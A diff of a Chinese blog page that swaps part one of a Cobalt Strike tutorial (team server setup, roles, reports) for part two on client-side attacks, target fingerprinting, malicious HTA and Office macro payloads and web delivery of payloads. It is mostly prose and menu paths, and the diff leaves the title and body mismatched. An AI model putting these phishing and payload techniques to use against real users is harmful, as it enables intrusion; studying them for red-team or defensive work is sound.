@@ -19,7 +19,7 @@
 <meta name="application-name" content="V4ler1an">
 <meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/index-zh.cn/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/index-zh.cn/" /><link rel="next" href="https://www.v4ler1an.com/2024/02/index-zh.cn/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/index-zh.cn/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/index-zh.cn/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/index-zh.cn/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -28,7 +28,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/index-zh.cn\/"
-        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "C2","wordcount":  5684 ,
+        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "C2","wordcount":  10376 ,
         "url": "https:\/\/www.v4ler1an.com\/2024\/01\/index-zh.cn\/","datePublished": "2024-01-13T05:57:40+08:00","dateModified": "2024-01-14T06:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
@@ -123,8 +123,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Cobalt Strike基础教程（一）</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-13">2024-01-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5684 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 12 分钟&nbsp;<span id="/2024/01/index-zh.cn/" class="leancloud_visitors" data-flag-title="Cobalt Strike基础教程（一）">
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-13">2024-01-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 10376 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 21 分钟&nbsp;<span id="/2024/01/index-zh.cn/" class="leancloud_visitors" data-flag-title="Cobalt Strike基础教程（一）">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                     </span>&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
@@ -134,163 +134,60 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#一基础操作">一、基础操作</a>
+    <li><a href="#一目标攻击">一、目标攻击</a>
       <ul>
-        <li><a href="#简介">简介</a></li>
-        <li><a href="#组织结构">组织结构</a></li>
-        <li><a href="#连接方式">连接方式</a>
+        <li><a href="#客户端程序攻击">客户端程序攻击</a></li>
+        <li><a href="#系统侦察">系统侦察</a></li>
+        <li><a href="#cobalt-strike的攻击方式">Cobalt Strike的攻击方式</a>
           <ul>
-            <li><a href="#开启server">开启server</a></li>
-            <li><a href="#client连接server">client连接server</a></li>
-            <li><a href="#client连接不同的server">client连接不同的server</a></li>
-          </ul>
-        </li>
-        <li><a href="#分布式协作">分布式协作</a>
-          <ul>
-            <li><a href="#可伸缩红队操作模型">可伸缩红队操作模型</a></li>
-            <li><a href="#团队角色">团队角色</a></li>
-          </ul>
-        </li>
-        <li><a href="#日志与报告">日志与报告</a>
-          <ul>
-            <li><a href="#日志记录">日志记录</a></li>
-            <li><a href="#导出报告">导出报告</a></li>
-            <li><a href="#报告类型">报告类型</a></li>
+            <li><a href="#user-driven-payload">User-Driven Payload</a></li>
+            <li><a href="#user-driven-attacks">User-Driven Attacks</a></li>
+            <li><a href="#联动msf">联动MSF</a></li>
+            <li><a href="#鱼叉钓鱼">鱼叉钓鱼</a></li>
           </ul>
         </li>
       </ul>
     </li>
-    <li><a href="#二基础设施">二、基础设施</a>
+    <li><a href="#二后渗透">二、后渗透</a>
       <ul>
-        <li><a href="#listener管理">Listener管理</a>
-          <ul>
-            <li><a href="#stager">Stager</a></li>
-            <li><a href="#创建listener">创建Listener</a></li>
-          </ul>
-        </li>
-        <li><a href="#http和https-beacon">HTTP和HTTPS Beacon</a></li>
-        <li><a href="#dns-beacon">DNS Beacon</a></li>
-        <li><a href="#smb-beacon">SMB Beacon</a></li>
-        <li><a href="#tcp-beacon">TCP Beacon</a></li>
-        <li><a href="#foreign-beacon">Foreign Beacon</a></li>
+        <li><a href="#beacon管理">Beacon管理</a></li>
+        <li><a href="#session传递">session传递</a></li>
+        <li><a href="#file-system">File System</a></li>
+        <li><a href="#用户驱动溢出攻击">用户驱动溢出攻击</a></li>
+        <li><a href="#browser-pivoting">Browser Pivoting</a></li>
+        <li><a href="#elevate-with-an-exploit">Elevate with an Exploit</a></li>
+        <li><a href="#elevate-with-known-credentials">Elevate with Known Credentials</a></li>
+        <li><a href="#get-system">Get SYSTEM</a></li>
+        <li><a href="#uac-bypass">UAC Bypass</a></li>
+        <li><a href="#mimikatz">Mimikatz</a></li>
+        <li><a href="#credential-and-hash-harvesting">Credential and Hash Harvesting</a></li>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#network-and-host-enumeration">Network and Host Enumeration</a></li>
+        <li><a href="#lateral-movement">Lateral Movement</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>Cobalt Strike基础教程（一）&ndash;v4ler1an</p>
-<h1 id="cobalt-strike基础教程一">Cobalt Strike基础教程（一）</h1>
-<h2 id="一基础操作">一、基础操作</h2>
-<h3 id="简介">简介</h3>
-<p>Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。</p>
-<p>Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。</p>
+            </div><div class="content" id="content"><p>Cobalt Strike基础教程（二）&ndash;v4ler1an</p>
+<h1 id="cobalt-strike基础教程二">Cobalt Strike基础教程（二）</h1>
+<h2 id="一目标攻击">一、目标攻击</h2>
+<h3 id="客户端程序攻击">客户端程序攻击</h3>
+<p>一种依靠应用程序使用控制端来进行的可视化攻击。</p>
+<p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p>
+<p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点<code>foothold</code>。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p>
+<h3 id="系统侦察">系统侦察</h3>
+<p><code>System Profiler</code>是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p>
+<p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择<code>System Profiler</code>功能模块，配置待跳转的URL等信息即可。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281004623.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281004623.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281004623.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281004623.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png"
-        title="image-20240222143954956" /></p>
-<h3 id="组织结构">组织结构</h3>
-<p>Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。</p>
-<p>文件目录结构如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/CobaltSrike_4.9.1<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ tree -L <span class="m">2</span> .
-</span></span><span class="line"><span class="cl">.
-</span></span><span class="line"><span class="cl">├── Client
-</span></span><span class="line"><span class="cl">│   ├── cobaltstrike.auth
-</span></span><span class="line"><span class="cl">│   ├── cobaltstrike-client.cmd		-- Windows client启动文件
-</span></span><span class="line"><span class="cl">│   ├── cobaltstrike-client.jar		-- client启动jar文件
-</span></span><span class="line"><span class="cl">│   ├── cobaltstrike-client.sh		-- Linux/MacOS client启动文件
-</span></span><span class="line"><span class="cl">│   └── uHook.jar							
-</span></span><span class="line"><span class="cl">└── Server
-</span></span><span class="line"><span class="cl">    ├── c2lint				-- 检查profile的错误和异常
-</span></span><span class="line"><span class="cl">    ├── cobaltstrike.auth
-</span></span><span class="line"><span class="cl">    ├── cobaltstrike.store              -- server和client加密通信的证书
-</span></span><span class="line"><span class="cl">    ├── data
-</span></span><span class="line"><span class="cl">    ├── downloads                       -- 文件下载目录
-</span></span><span class="line"><span class="cl">    ├── logs                            -- 日志目录
-</span></span><span class="line"><span class="cl">    ├── screenshots                     -- 截图目录
-</span></span><span class="line"><span class="cl">    ├── source-common.sh
-</span></span><span class="line"><span class="cl">    ├── teamserver			-- server启动脚本
-</span></span><span class="line"><span class="cl">    ├── TeamServerImage			-- 实际的启动elf文件
-</span></span><span class="line"><span class="cl">    └── third-party		        -- 第三方工具
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="连接方式">连接方式</h3>
-<p>Cobalt Strike的client想要连接server需要知道三个信息：</p>
-<ul>
-<li>server的外部ip地址</li>
-<li>serve的连接密码</li>
-<li>(optional)决定malleable C2工具的哪一个配置文件用于server</li>
-</ul>
-<h4 id="开启server">开启server</h4>
-<p>开启server的常规命令如下（Linux环境）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./teamserver your_ip your_password <span class="o">[</span>config_file<span class="o">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/CobaltSrike_4.9.1/Server<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ sudo ./teamserver 172.16.86.138 v4ler1an
-</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Will use existing X509 certificate and keystore <span class="o">(</span><span class="k">for</span> SSL<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting teamserver
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Team Server Version: 4.9.1 <span class="o">(</span>Pwn3rs<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting <span class="s1">&#39;https.protocols&#39;</span> system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
-</span></span><span class="line"><span class="cl">... ...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Team server is up on 0.0.0.0:50050
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SHA256 <span class="nb">hash</span> of SSL cert is: xxxx
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listener: <span class="nb">test</span> started!
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="client连接server">client连接server</h4>
-<p>client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下:</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281004623.png"
+        title="image-20240228100435941" /></p>
+<p>如果勾选了<code>Use Java Applet to get information</code>则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p>
+<p>配置完成后，目标打开配置后的链接后，可以在三个地方进行观察：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -298,440 +195,784 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/CobaltSrike_4.9.1/Client<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ ls
-</span></span><span class="line"><span class="cl">cobaltstrike.auth  cobaltstrike-client.cmd  cobaltstrike-client.jar  cobaltstrike-client.sh  uHook.jar
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">View --&gt; Applications
+</span></span><span class="line"><span class="cl">View --&gt; Web Log
+</span></span><span class="line"><span class="cl">Cobalt Strike --&gt; Visualization --&gt; Target Table
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>直接运行对应的文件即可。</p>
+</div><p>目标打开链接后，在CS上就可以看到目标使用的浏览器版本、系统版本等信息，然后就可以搜索相关的漏洞。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035855.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035855.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035855.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035855.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png"
-        title="image-20240222142725955" /></p>
-<p>点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035855.png"
+        title="image-20240227203537827" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035369.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035369.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035369.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035369.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png"
-        title="image-20240222142904061" /></p>
-<p>成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。</p>
-<h4 id="client连接不同的server">client连接不同的server</h4>
-<p>Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。</p>
-<p>连接不同的server，在client的左上角的+号，输入server信息即可连接：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035369.png"
+        title="image-20240227203525334" /></p>
+<p>值得注意的是，如果CS的web服务器收到了lynx、wget或curl的请求，CS会自动返回一个404，防止被蓝队窥探。</p>
+<h3 id="cobalt-strike的攻击方式">Cobalt Strike的攻击方式</h3>
+<p><strong>User-Driven Attacks</strong></p>
+<p>用户驱动攻击，即需要欺骗用户进行交互以达到攻击目的的一种攻击方式。</p>
+<p>首先用户驱动攻击不包含恶意攻击代码，因此可以绕过系统的安全补丁防御；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后用户驱动攻击的方式比较可靠稳定。</p>
+<p>CS内置了几个用户驱动攻击的选项，在最新的4.9版本中，已经没有原来的<code>Attacks --&gt; Packages</code>，而是拆分到了<code>Payloads</code>和<code>Attacks</code>两个选项下。</p>
+<h4 id="user-driven-payload">User-Driven Payload</h4>
+<p>在<code>Payloads</code>选项下，包含的payload类型如下：</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281012180.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281012180.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281012180.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281012180.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png"
-        title="image-20240222145413463" /></p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281012180.png"
+        title="image-20240228101216117" /></p>
+<p><strong>1、HTML Application</strong></p>
+<p>HTML应用<code>HTML Application</code>生成(executable/VBA/powershell)这3种原理不同的VBScript实现的<code>evil.hta</code>文件。（实测win10就已经失效，不起作用了。）</p>
+<p><strong>2、Microsoft Office Macro</strong></p>
+<p>Microsoft Office 宏文件<code>Microsoft Office Document Macros</code>可以生成恶意宏放入office文件，非常经典的攻击手法。（实测win版本excel无效，wps不启用宏。）</p>
+<p><strong>3、Stager/Stageless Payload Generator</strong></p>
+<p>Payload生成器<code>Payload Generator</code>可以生成各种语言版本的Payload，便于进行免杀。</p>
+<p><strong>4、Windows Stager Payload</strong></p>
+<p>Windows 可执行文件<code>Windows Executable</code> 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p>
+<p><strong>5、Windows Stageless Payload</strong></p>
+<p>Windows 可执行文件（Stageless）<code>Windows Executable (Stageless)</code>会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p>
+<h4 id="user-driven-attacks">User-Driven Attacks</h4>
+<p>在<code>Attacks</code>选项下，包含的web类攻击方式有：</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281018230.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281018230.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281018230.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281018230.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png"
-        title="image-20240222145445280" /></p>
-<p>此时在最下方就会有多个server连接的切换条。</p>
-<h3 id="分布式协作">分布式协作</h3>
-<p>这里以最基本的团队模型为例，涉及三个server：</p>
-<ul>
-<li>Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。</li>
-<li>Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。</li>
-<li>Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。</li>
-</ul>
-<h4 id="可伸缩红队操作模型">可伸缩红队操作模型</h4>
-<p>Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。</p>
-<p>目标单元的工作：</p>
-<ul>
-<li>负责具体目标或行动的对象</li>
-<li>获得访问权限、后渗透、横向移动</li>
-<li>维护本地基础设施</li>
-</ul>
-<p>访问管理单元的工作：</p>
-<ul>
-<li>保持所有目标网络的访问权限</li>
-<li>获取访问权限并接收来自单元的访问</li>
-<li>根据需要传递对目标单元的访问</li>
-<li>为持续回调保持全局基础环境</li>
-</ul>
-<h4 id="团队角色">团队角色</h4>
-<ul>
-<li>初始渗透人员，主要任务是进入目标系统，并扩大立足点</li>
-<li>后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息</li>
-<li>权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话</li>
-</ul>
-<h3 id="日志与报告">日志与报告</h3>
-<h4 id="日志记录">日志记录</h4>
-<p>Cobalt Strike的日志文件在团队服务器下的运行目录中的<code>logs</code>文件夹内，其中有些日志文件名例如<code>beacon_11309.log</code>，这里的<code>11309</code>就是beacon会话的ID。</p>
-<p>按键的日志在<code>keystrokes</code>文件夹内，截屏的日志在<code>screenshots</code>文件夹内，截屏的日志名称一般如<code>screen_015321_4826.jpg</code>类似，其中<code>015321</code>表示时间（1点53分21秒），<code>4826</code>表示ID。</p>
-<h4 id="导出报告">导出报告</h4>
-<p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p>
-<ul>
-<li>输出格式为PDF或者Word格式</li>
-<li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li>
-<li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。</li>
-</ul>
-<h4 id="报告类型">报告类型</h4>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281018230.png"
+        title="image-20240228101842180" /></p>
+<p><strong>1、Scripted Web Delibery(S)</strong></p>
+<p>脚本化web托管，为payload提供一个web服务便于下载和执行，类似于msf的Script Web Delivery。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281027496.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281027496.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281027496.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281027496.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png"
-        title="image-20240222153927259" /></p>
-<ul>
-<li>
-<p>活动报告（Activity Report）</p>
-<p>提供红队活动的时间表，记录了每个后渗透活动。</p>
-</li>
-<li>
-<p>主机报告（Hosts Report）</p>
-<p>汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。</p>
-</li>
-<li>
-<p>入侵指标报告（Indicators of Compromise）</p>
-<p>包括对C2扩展文件的分析、使用的域名和上传文件的md5。</p>
-</li>
-<li>
-<p>会话报告（Sessions Report）</p>
-<p>记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</p>
-</li>
-<li>
-<p>社工报告（Social Engineering Report）</p>
-<p>记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。</p>
-</li>
-<li>
-<p>TTP报告（Tactics，Techniques，and Procedures）</p>
-<p>将自己的CS行动与ATT&amp;CK矩阵进行映射，给出具体的ttp。</p>
-</li>
-</ul>
-<h2 id="二基础设施">二、基础设施</h2>
-<h3 id="listener管理">Listener管理</h3>
-<p>定义：等待受害目标回连自己的一个服务。</p>
